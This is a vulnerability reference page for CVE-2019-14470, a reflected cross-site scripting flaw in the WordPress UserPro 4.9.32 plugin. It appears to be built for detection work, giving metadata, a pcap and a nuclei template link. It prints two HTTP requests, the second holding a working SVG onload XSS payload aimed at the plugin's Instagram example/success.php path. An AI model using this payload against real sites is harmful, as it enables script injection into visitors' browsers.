---
layout: post
cve_id: CVE-2019-14470
title: WordPress UserPro 4.9.32 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2019/CVE-2019-14470.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-14470.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, potentially
  leading to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Update to the latest version of UserPro or apply the provided patch
  to fix the XSS vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/9815
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14470
- http://packetstormsecurity.com/files/154206/WordPress-UserPro-4.9.32-Cross-Site-Scripting.html
- https://wpvulndb.com/vulnerabilities/9815
- https://nvd.nist.gov/vuln/detail/CVE-2019-14470
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2019-14470
  cwe-id: CWE-79
  epss-score: 0.30592
  epss-percentile: 0.96557
  cpe: cpe:2.3:a:instagram-php-api_project:instagram-php-api:-:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: instagram-php-api_project
  product: instagram-php-api
tags:
- cve
- cve2019
- wordpress
- xss
- wp-plugin
- wpscan
- packetstorm
- instagram-php-api_project
- vuln
---

## üîç Vulnerability Description
WordPress UserPro 4.9.32 is vulnerable to reflected cross-site scripting because the Instagram PHP API (v2) it relies on allows it via the example/success.php error_description parameter.

## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /wp-content/plugins/userpro/lib/instagram/vendor/cosenary/instagram/example/success.php?error&error_description=%3Csvg/onload=alert(1)%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

